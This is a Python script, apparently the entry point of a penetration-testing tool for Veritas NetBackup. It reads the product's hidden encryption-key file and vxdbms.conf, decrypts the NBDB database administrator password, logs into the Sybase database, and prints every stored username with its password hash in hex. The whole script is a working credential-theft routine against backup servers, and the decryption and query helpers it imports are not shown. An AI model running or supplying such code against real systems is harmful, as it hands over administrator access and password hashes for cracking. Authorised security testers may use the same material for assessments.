#!/usr/bin/python3
import codecs
import argparse
import logging

from .NBDBDBAPwdRetriever import NBDBDBAPwdRetriever
from .ParseFilesHelper import ParseFilesHelper
from .NBDBSybaseConnector import NBDBSybaseConnector


def parse_args():
    parser = argparse.ArgumentParser(
        description="Purpose: Retrieve DBA pwd of NBDB.db and get User Infos"
    )
    parser.add_argument(
        "-k",
        "--yekcnedwssap_file_path",
        help=".yekcnedwssap file path (example: /usr/openv/var/global/.yekcnedwssap)",
        required=True,
    )
    parser.add_argument(
        "-p",
        "--vxdbmsconf_file_path",
        help="vxdbms.conf file path (example: /usr/openv/db/data/vxdbms.conf)",
        required=True,
    )
    parser.add_argument(
        "-j",
        "--jconn4_file_path",
        help="jconn4 jar file path (example: /usr/openv/netbackup/web/jconn4-16.0.jar)",
        required=True,
    )
    parser.add_argument(
        "--host",
        "-H",
        help="IP address of the host where the NBDB Sybase Server is running",
        required=True,
    )
    parser.add_argument(
        "--port",
        default=13785,
        help="Port where the NBDB Sybase Server is running (default: 13785)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Run in verbose mode",
        action="store_true",
        default=False,
    )

    return parser.parse_args()


def main():
    args = parse_args()

    # Start by setting up logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    filehlpr = ParseFilesHelper(
        args.yekcnedwssap_file_path,
        args.vxdbmsconf_file_path,
    )
    key = filehlpr.find_current_encryptionkey()
    pwd = filehlpr.find_current_VXDBMS_NB_PASSWORD()

    pwd_retriever = NBDBDBAPwdRetriever(key)
    dbapwd = pwd_retriever.decrypt_nbdb_dba_password(pwd)

    nbdbcntr = NBDBSybaseConnector(
        dbapwd.decode("ascii"), args.host, args.port, args.jconn4_file_path
    )
    if nbdbcntr.con:
        curs = nbdbcntr.get_username_and_hashedpwd_from_ndbd()
        if curs != None:
            for u, p in curs:
                if p != None:
                    print(
                        "Username: "
                        + str(u).replace(" ", "")
                        + "\tHash: "
                        + codecs.encode(p, "hex").decode()
                    )
        nbdbcntr.con.close()


if __name__ == "__main__":
    main()
